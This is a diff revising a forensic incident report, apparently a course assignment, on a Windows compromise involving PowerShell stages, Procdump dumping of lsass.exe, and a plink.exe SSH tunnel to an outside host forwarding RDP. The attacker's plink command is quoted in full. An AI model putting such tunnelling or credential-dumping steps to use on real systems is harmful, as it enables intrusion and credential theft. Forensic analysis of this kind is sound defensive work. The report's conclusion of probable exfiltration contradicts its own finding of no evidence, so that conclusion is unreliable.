@@ -126,6 +126,10 @@ The system was compromised through a well-orchestrated attack that began with th
   - **Base64 Decoded Scripts:** `sticky.ps1`, `Service.ps1`, etc.
 
 ###
+Below is the revised draft for **Question 2** of the report, updated to include all necessary details about `plink.exe` and its role in the compromise:
+
+---
+
 ### **Technical Incident Report: Extent of the Compromise**
 
 ---
@@ -204,7 +208,7 @@ The second and third stages of the infection involved the execution of PowerShel
      Command: plink.exe -ssh 69.50.64.20 -P 22 -L 127.0.0.1:12345:10.2.0.2:3389
      ```
 
-   - **Significance:** The execution of plink.exe and its use for SSH tunneling and RDP forwarding were critical in ensuring the attacker could maintain control over the compromised system. This persistence mechanism allowed the attacker to bypass network defenses and potentially exfiltrate data or execute further commands remotely. The fact that the forwarded port was 3389, the default port for RDP, indicates the attacker was specifically aiming to enable remote desktop access, which is a strong indication of the sophistication and intent behind the compromise..
+   - **Significance:** The execution of `plink.exe` and its use for SSH tunneling and RDP forwarding were critical in ensuring the attacker could maintain control over the compromised system. This persistence mechanism allowed the attacker to bypass network defenses and potentially exfiltrate data or execute further commands remotely. The fact that the forwarded port was 3389, the default port for RDP, indicates the attacker was specifically aiming to enable remote desktop access, which is a strong indication of the sophistication and intent behind the compromise.
 
 ---
 
@@ -229,6 +233,15 @@ The second and third stages of the infection involved the execution of PowerShel
 The extent of the compromise was severe, involving multiple stages of infection that effectively disabled the system's defenses, established persistent backdoors, and enabled remote access through an SSH tunnel. The attacker's use of PowerShell scripts and malicious executables, combined with the creation of an SSH tunnel via `plink.exe`, allowed for sustained control over the compromised system. The communication with a C2 server further indicates that the attacker maintained ongoing remote access, potentially for data exfiltration or further exploitation.
 
 This report highlights the sophisticated nature of the attack, the methods used to bypass security measures, and the extent of the system compromise. The evidence gathered from PowerShell logs, memory analysis, and network traffic provides a detailed understanding of the attack's progression and impact.
+
+---
+
+
+
+Below is the revised draft for **Question 3** of the report, updated with the new information provided regarding `Procdump64.exe`, `plink.exe`, and the analysis of potential data exfiltration:
+
+---
+
 ### **Technical Incident Report: Data Exfiltration Analysis**
 
 ---
@@ -243,7 +256,7 @@ The investigation into the compromised system revealed that sensitive informatio
 
 #### **1. Credential Dumping via `Procdump`**
 
-One of the most critical pieces of evidence pointing to data exfiltration is the use of `Procdump`, a Sysinternals tool, to dump the memory of the `lsass.exe` process. The Local Security Authority Subsystem Service (LSASS) is responsible for enforcing security policy on the system, including managing user logins, password changes, and generating access tokens. By dumping the memory of `lsass.exe`, the attacker could extract plaintext passwords and other authentication tokens, which could then be used for lateral movement within the network or for further exploitation.
+One of the most critical pieces of evidence pointing to data exfiltration is the use of `Procdump`, a Sysinternals tool, to dump the memory of the `lsass.exe` process. The Local Security Authority Subsystem Service (LSASS) is responsible for enforcing security policies on the system, including managing user logins, password changes, and generating access tokens. By dumping the memory of `lsass.exe`, the attacker could extract plaintext passwords and other authentication tokens, which could then be used for lateral movement within the network or for further exploitation.
 
 - **Evidence:**
   - **Command History:**
@@ -263,11 +276,14 @@ One of the most critical pieces of evidence pointing to data exfiltration is the
   - **Location:**
     The `ConsoleHost_history.txt` file was found at `C:\Users\Craig\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`, providing a direct record of the attacker's actions.
 
-- **Impact:**
-  - **Credential Theft:**
-    The `lsass.dmp` file would likely contain plaintext passwords, NTLM hashes, and Kerberos tickets, enabling the attacker to impersonate users and access additional systems within the network.
-  - **Further Compromise:**
-    With these credentials, the attacker could perform lateral movement, escalate privileges, or exfiltrate additional data.
+  - **Impact:**
+    - **Credential Theft:**
+      The `lsass.dmp` file would likely contain plaintext passwords, NTLM hashes, and Kerberos tickets, enabling the attacker to impersonate users and access additional systems within the network.
+    - **Further Compromise:**
+      With these credentials, the attacker could perform lateral movement, escalate privileges, or exfiltrate additional data.
+
+- **Investigation Outcome:**
+  - Despite analyzing network traffic using Wireshark and searching for potential exfiltration activity, no conclusive evidence was found that `lsass.dmp` was transmitted over the network. The absence of data exfiltration evidence suggests that either the exfiltration did not occur via standard network channels, or alternative methods were used that were not captured during the investigation.
 
 ---
 
@@ -282,6 +298,9 @@ The attacker used `plink.exe`, a command-line tool from the PuTTY suite, to esta
     ```plaintext
     plink.exe -ssh 69.50.64.20 -P 22 -L 127.0.0.1:12345:10.2.0.2:3389
     ```
+
+  - **Memory Analysis:**
+    Memory artifacts showed that `plink.exe` had loaded several critical DLLs, including `ntdll.dll`, `kernel32.dll`, and `crypt32.dll`, indicating that it was actively engaged in system-level operations and potentially managing encrypted communications.
 
   - **Impact:**
     - **Remote Desktop Access:**
@@ -316,14 +335,5 @@ Given the attacker's persistent access to the system and their ability to contro
 
 The attacker likely exfiltrated critical data from the host, including plaintext credentials from the `lsass.dmp` file and potentially other sensitive documents through the established SSH tunnel. The use of `Procdump` to extract memory from `lsass.exe` provided the attacker with the means to harvest authentication credentials, which could be used for further attacks or sold on the dark web. The SSH tunnel established by `plink.exe` facilitated secure, encrypted communication, likely used for both remote control and data exfiltration. Given the evidence, it is highly probable that the attacker was able to exfiltrate valuable information, posing a significant threat to the security of the compromised network.
 
-### **Recommendations**
+---
 
-- **Immediate Actions:**
-  - Conduct a full audit of all systems to identify any additional compromised hosts or exfiltrated data.
-  - Reset all user and administrative passwords within the network, focusing on those accounts identified in the `lsass.dmp` dump.
-  - Block all outgoing connections to the identified C2 server (`69.50.64.20`) and investigate any related network traffic for signs of data exfiltration.
-
-- **Long-Term Actions:**
-  - Implement more rigorous monitoring of PowerShell activity and the use of administrative tools like `Procdump` and `plink.exe`.
-  - Educate users about the dangers of phishing and the importance of verifying the legitimacy of downloaded files.
-  - Regularly audit and review firewall and security settings to prevent unauthorized access and data exfiltration.
